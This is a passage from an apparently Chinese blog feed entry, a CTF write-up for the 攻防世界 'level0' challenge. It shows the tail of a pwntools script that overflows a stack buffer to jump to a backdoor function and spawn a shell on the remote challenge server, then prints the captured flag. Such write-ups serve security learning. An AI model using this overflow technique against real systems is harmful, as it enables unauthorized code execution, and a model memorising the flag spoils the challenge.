<span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./level0"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">52125</span><span class="token punctuation">)</span>   <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callsystem_addr<span class="token punctuation">)</span>    <span class="token comment"># 这里不用callsystem_addr直接用0x0400596也是可以的</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{4fe5a9ae3ea3933da95ede70cc81c13a}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/uybAwWYmaGoFg48.png" alt="攻防世界-level0 8.png"></p><p>只出现了 <code>[*] Switching to interactive mode</code>，而没有 <code>[*] Got EOF while reading in interactive</code>，说明已经 PWN 通，得到 flag</p>]]></content>
    
    
    <summary type="html">经典的栈溢出，跳转到后门函数的位置，比较简单，熟悉了 system(&quot;/bin/sh&quot;) 的原理</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.4ss1du0us.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
    <category term="PWN" scheme="https://www.4ss1du0us.cn/tags/PWN/"/>
    
  </entry>
  
</feed>
